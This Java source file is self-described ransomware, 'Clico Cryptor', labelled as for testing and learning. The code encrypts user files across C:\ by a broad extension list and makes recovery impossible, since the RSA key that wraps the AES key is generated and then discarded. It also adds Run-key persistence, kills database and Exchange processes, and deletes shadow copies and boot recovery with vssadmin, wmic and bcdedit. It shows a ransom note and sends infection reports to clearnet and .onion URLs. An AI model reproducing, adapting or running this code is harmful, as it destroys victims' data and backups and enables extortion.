/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package clicocryptor;




import java.io.File;
import java.io.FileInputStream;
import java.security.MessageDigest;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.URL;

import java.nio.file.Files;
import java.nio.file.Paths;
import java.nio.file.Path;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.NoSuchAlgorithmException;
import java.security.PrivateKey;
import java.security.PublicKey;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.FileOutputStream;
import java.net.URLConnection;
import java.util.Random;
/**
 *
 * @author Maciej
 */
public class Clicocryptor {

    
    public static String string1 =  "Clico Cryptor Ransomware 1.1";
    public static String string2 =  "Software created for testing/learning purpuses only ";
    public static String string3 =  "Redistribution is strictly prohibited "; 
    public static String string4 =  "Please don't use on prodution system as there is no going back";
   public static String string5 =   "Dev by  Maciej mac Maczka";
   public static String string6 =   "maciej.maczka@clico.pl";
   public static String string7 =   "maciej.maczka@gmail.com";
   public static String string8 =   "I do not take any resposibility for  any misuse";
      
    
    static byte[] byte_wrapped_key;
    
    static double encrypted_files = 0;
    
    static String string_key_seed = "to jest tajny klucz 1 2 3 bolek lolek no i krecik";
    static  byte[] byte_encryption_key;
    
    static String directory_to_encrypt = "C:\\";
    static File file_directory_to_ecrypt;
  //  static File[] file_list_to_encrypt;
    
    static String string_operation_mode;
    
    static String[] extensions = {
        
        ".der", ".pfx",  ".crt", ".csr", ".pem", ".odt", ".ott", ".sxw", ".stw", ".uot", ".max", ".ods", ".ots", ".sxc", ".stc", ".dif", ".slk", ".odp",
".otp", ".sxd", ".std", ".uop", ".odg", ".otg", ".sxm", ".mml", ".lay", ".lay6", ".asc", ".sqlite3", ".sqlitedb", ".sql", ".accdb", ".mdb",
".dbf", ".odb", ".frm", ".myd", ".myi", ".ibd", ".mdf", ".ldf", ".sln", ".suo", ".cpp", ".pas", ".asm", ".cmd", ".bat", ".vbs", ".dip", ".dch",
".sch", ".brd", ".jsp", ".php", ".asp",  ".class", ".wav", ".swf", ".fla", ".wmv", ".mpg", ".vob", ".mpeg", ".asf", ".avi",
".mov", ".mkv", ".flv", ".wma", ".mid", ".djvu", ".svg", ".psd", ".nef", ".tiff", ".tif", ".cgm", ".raw", ".gif",  ".bmp", ".jpg", ".jpeg",
".vcd", ".iso", ".backup", ".zip", ".rar", ".tgz", ".tar", ".bak", ".tbk", ".PAQ", ".ARC", ".aes", ".gpg", ".vmx", ".vmdk", ".vdi", ".sldm",
".sldx", ".sti", ".sxi", ".hwp", ".snt", ".onetoc2", ".dwg", ".pdf", ".wks", ".rtf", ".csv", ".txt", ".vsdx", ".vsd", ".edb", ".eml", ".msg",
".ost", ".pst", ".potm", ".potx", ".ppam", ".ppsx", ".ppsm", ".pps", ".pot", ".pptm", ".pptx", ".ppt", ".xltm", ".xltx", ".xlc", ".xlm",
".xlt", ".xlw", ".xlsb", ".xlsm", ".xlsx", ".xls", ".dotx", ".dotm", ".dot", ".docm", ".docb", ".docx", ".doc" 
    
    };
    
    /**
     * @param args the command line arguments
     */
    public static boolean check_extensions(String string_file_path)
    {
        
        for ( int i = 0 ; i < extensions.length ; i++ )
        {
            
            if (string_file_path.endsWith(extensions[i]))
            {
                
                System.out.print(string_file_path + " ");
                return true;
            }
            
            
            
        }
        
        return false;
        
        
        
        
    }
    
    
    public static void list_directory(String string_directory_path)
    {
        
        try
        {
        
              file_directory_to_ecrypt = new File(string_directory_path);
              File[] file_list_to_encrypt = file_directory_to_ecrypt.listFiles();
              
              
              if (file_list_to_encrypt  == null)
              {
                  
                  return;
                  
              }
              
              
              for (int i = 0 ; i < file_list_to_encrypt.length ; i++)
              {
                  
                  try
                  {
                  
            //      System.out.print(file_list_to_encrypt[i].getAbsolutePath());
                  
                  if (file_list_to_encrypt[i].isDirectory())
                  {
                       
                        list_directory(file_list_to_encrypt[i].getAbsolutePath());
                  
                  }
                  
                  if (file_list_to_encrypt[i].isFile())
                  {
                        if (check_extensions(file_list_to_encrypt[i].getAbsolutePath()))
                        {
                            if ((file_list_to_encrypt[i].length() < 5000000) && !(file_list_to_encrypt[i].isHidden()))
                            {
                                read_file(file_list_to_encrypt[i].getAbsolutePath());
                                
                            }
                        }
                  }
                  
                  } catch (Exception e)
                  {
                      
                      System.out.print("DDD:" + e.getLocalizedMessage());
                      
                  }
                  
                  
              }
        
        }
        catch (Exception e)
        {
            
            System.out.println("L:" + e.getMessage());
         
            
        }
        
        
        
    }
    
    public static void load_key()
    {
        try
        {
            
            KeyPairGenerator gen = KeyPairGenerator.getInstance("RSA");
            gen.initialize(2048);
            KeyPair key = gen.generateKeyPair();
            
            
         String  key_random_seed = "";
            
         //   ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("info.key"));
     // final PublicKey publicKey = (PublicKey) inputStream.readObject();
   
            final PublicKey publicKey =  key.getPublic();
        
      
        Random rand = new Random(System.currentTimeMillis());
        
        
            for ( int i = 0 ; i < 10 ; i++)
            {



              key_random_seed = key_random_seed + Integer.toString( 1000 * rand.nextInt());

            }
            
            key_random_seed = key_random_seed + string_key_seed;
            string_key_seed = key_random_seed;
        
            MessageDigest md5 = MessageDigest.getInstance("MD5");
            byte_encryption_key = md5.digest(string_key_seed.getBytes());
            
            
            for (int i = 0 ; i < byte_encryption_key.length ; i++)
            {
                
       //        System.out.print(String.format("%02x", byte_encryption_key[i]));
                
            }
            System.out.println("xxx");
            
             final Cipher cipher = Cipher.getInstance("RSA");
             cipher.init(Cipher.ENCRYPT_MODE, publicKey);
            
            byte_wrapped_key = cipher.doFinal(byte_encryption_key);
           
           for (int i = 0 ; i < byte_wrapped_key.length ; i++)
            {
                
               System.out.print(String.format("%02x", byte_wrapped_key[i]));
                
            }
            
            new File("C:\\ClicoCrypter").mkdir();
           
           FileOutputStream fos = new FileOutputStream("C:\\ClicoCrypter\\encryption.key");
            fos.write(byte_wrapped_key);
            fos.close();
            
        }
        catch (Exception e)
        {
            
            System.out.println("L: " + e.getMessage());
            
        }
    }
    
    
    public static void report_infection()
    {
        
        try
        {
        System.out.println("");
        String[] url_list = { "http://www.clico.pl", "http://www.epg.org.pl", "http://fsdlkfsdkljfksjd.onion", "http://fdskjfsdkjfkdjsf.onion", "http://nfsjfnsdnfoeitpfsdfsd.onion" , "http://fdslkfsdkjfsjdkfjksdiewjrjkfjsdkfjd.org.pl"};
        
        URL url;
        
        
        for (int i = 0 ; i < url_list.length; i++)
        {
        
            try
            {
            
            url = new URL(url_list[i]);
                URLConnection conn = url.openConnection();

                            BufferedReader br = new BufferedReader(
                                   new InputStreamReader(conn.getInputStream()));

                            String inputLine;
                while ((inputLine = br.readLine()) != null) {

                }

            }
            catch (Exception e)
            {
                
                System.out.println("U: " + e.getMessage());
                
            }
        }
            
        }
        catch (Exception e)
        {
            
            System.out.println("U: " + e.getMessage());
            
        }
        
    }
    
    
    public static void persistance()
    {
        
        try
        {
        String s = null;
        
         ProcessBuilder builder = new ProcessBuilder("cmd.exe" , "/c" , "REG add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /t REG_SZ /d \"abc.exe\" /f /v ccrpt");
        
         Process p = builder.start();
        //Process p = Runtime.getRuntime().exec
        
        
        builder = new ProcessBuilder("cmd.exe" , "/c" , "taskkill.exe /f /im Microsoft.Exchange.*");
        builder.start();
        
               
        builder = new ProcessBuilder("cmd.exe" , "/c" , "taskkill.exe /f /im MsExchange*");
        builder.start();
        
        
                      
        builder = new ProcessBuilder("cmd.exe" , "/c" , "taskkill.exe /f /im sqlserver.exe");
        builder.start(); 
        
        
        
        builder = new ProcessBuilder("cmd.exe" , "/c" , "taskkill.exe /f /im sqlwriter.exe");
        builder.start(); 
        
        
        builder = new ProcessBuilder("cmd.exe" , "/c" , "taskkill.exe /f /im mysqld.exe");
        builder.start(); 
        
        
        builder = new ProcessBuilder("cmd.exe" , "/c" , "vssadmin Delete  Shadows /ALL /quiet");
        builder.start();    
        
        
        builder = new ProcessBuilder("cmd.exe" , "/c" , "wmic shadowcopy delete");
        builder.start();    
        
                
        builder = new ProcessBuilder("cmd.exe" , "/c" , "bcdedit.exe /set recoveryenabled no");
        builder.start();    
        
               
      //  builder = new ProcessBuilder("cmd.exe" , "/c" , "wbadmin delete catalog -quiet");
       // builder.start();            
          builder = new ProcessBuilder("cmd.exe" , "/c" , "REG add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /t REG_SZ /d \"C:\\\\ClicoCrypter\\aaa.bmp\" /f /v Wallpaper");
        
          p = builder.start();
        
         builder = new ProcessBuilder("cmd.exe" , "/c" , "reg add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v WallpaperStyle /f /t REG_SZ /d 10");
        
          p = builder.start();
          
          builder = new ProcessBuilder("cmd.exe" , "/c" , "RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters ");
        
          p = builder.start();
            
          
          System.out.println("proc");
          
        
        }
        catch (Exception e)
        {
            
            System.out.println("P:" + e.getMessage());
            
            
        }
        
        
        
    }
    
    
    public static void crpyt_notify()         
    {
        
        window frame_notify = new window();
        
        frame_notify.setLocationRelativeTo(null);
        frame_notify.setVisible(true);
        
        
        frame_notify.jTextArea1.setText("Wszystkie twoje pliki zostaly zaszyfrowane. Aby je odzyskac oplac abonament ADB/TVR na najblizesz dzisiec lat. Nastepnie wejdz na stol i krzyknij \"JESTEM KROLEM ZWIERZAT\". Twoje pliki zostana przywrocone. \n\n Masz na to 15 minut \n \n");
    frame_notify.jTextArea1.append("KLUCZ SZYFRUJACY: ");
                for (int i = 0 ; i < byte_wrapped_key.length ; i++)
            {
                
                frame_notify.jTextArea1.append(String.format("%02x", byte_wrapped_key[i]));                
                
            }
        
        
    }
    
    
    
    public static void main(String[] args)
    {
        
        
        System.out.println("1.1");
        create_key(string_key_seed);
        
        try
        {

                 load_key();
           persistance();
           
           
             crpyt_notify();
                 list_directory("C:\\Users");
            
                list_directory(directory_to_encrypt);
        
                
                System.out.println("\n\n FILES ENCRYPTED: " + encrypted_files  +"\n" ); 
                  
                
                 report_infection();
               
        }
        catch (Exception e)
        {
            
            System.out.println("M:" + e.getMessage());
            System.exit(-1);
            
            
        }
        
        
        
    }
    
    public static void read_file(String file_name)
    {
        
        try
        {
        
        Path path_file_to_ecrypt = Paths.get(file_name);
        
        byte[] byte_original_file_content = Files.readAllBytes(path_file_to_ecrypt);
        
        System.out.print(byte_original_file_content.length + " " );
        
        encrypt_file(byte_original_file_content, file_name );
        
        }
        catch (Exception e)
        {
            
            System.out.println("R:" + e.getMessage());
            
            
            
        }
        
    }
    
    
    public static void encrypt_file(byte[] original_content, String file_name)
    {
        
        try
        {
        
              Cipher aes_cipher =  Cipher.getInstance("AES/ECB/PKCS5Padding");
              SecretKeySpec aes_key_spec = new SecretKeySpec(byte_encryption_key, "AES");       
        
              aes_cipher.init(Cipher.ENCRYPT_MODE, aes_key_spec);
              
              byte[] encrypted_content = aes_cipher.doFinal(original_content);
              
              System.out.print(encrypted_content.length + " ");
              
              Path path_file_to_ecrypt = Paths.get(file_name);
              
              Files.write(path_file_to_ecrypt, encrypted_content);
              
              System.out.println ("- X- ");
              
              Files.move(path_file_to_ecrypt, Paths.get(file_name + ".enc"));
              encrypted_files++;
              
        }
        catch (Exception e )
        {
            
            System.out.println("E: " + e.getMessage());
            
            
        }
        
        
    }
    
    
    
    
    public static void create_key(String string_key_seed)
    {
        
        try
        {
        
            MessageDigest md5 = MessageDigest.getInstance("MD5");
            byte_encryption_key = md5.digest(string_key_seed.getBytes());
       
        }
        catch (Exception e)
        {
            
            System.out.println("C:" + e.getMessage());
            
            
        }
                
        
        
        
    }
    
    
}
